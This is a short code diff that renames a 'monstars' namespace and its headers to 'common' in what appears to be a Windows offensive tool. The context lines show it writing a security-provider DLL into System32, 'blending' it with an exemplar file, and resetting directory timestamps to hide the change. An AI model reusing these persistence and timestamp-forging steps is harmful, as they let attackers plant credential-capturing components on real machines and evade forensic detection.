@@ -3,8 +3,8 @@
 #include <sspi.h>
 #include <aclapi.h>
 
-#include <monstars/file.h>
-#include <monstars/logging.h>
+#include <common/file.h>
+#include <common/logging.h>
 
 #include "resource.h"
 
@@ -37,13 +37,13 @@ int main()
     // write the provider DLL to disk
     wchar_t targetPath[MAX_PATH];
     wsprintfW(targetPath, L"C:\\Windows\\System32\\%s.dll", c_ProviderName);
-    if (!monstars::DropAndBlendFile(targetPath, static_cast<char*>(providerBin), providerSize, c_ExemplarPath))
+    if (!common::DropAndBlendFile(targetPath, static_cast<char*>(providerBin), providerSize, c_ExemplarPath))
     {
         LOG_LINE_ERROR;
         return ERROR_WRITE_FAULT;
     }
     // fix system32 timestamps
-    if (!monstars::MatchFileTimes(L"C:\\Windows\\System32", c_ExemplarPath))
+    if (!common::MatchFileTimes(L"C:\\Windows\\System32", c_ExemplarPath))
     {
         LOG_LINE_ERROR;
         return ERROR_TIME_SKEW;
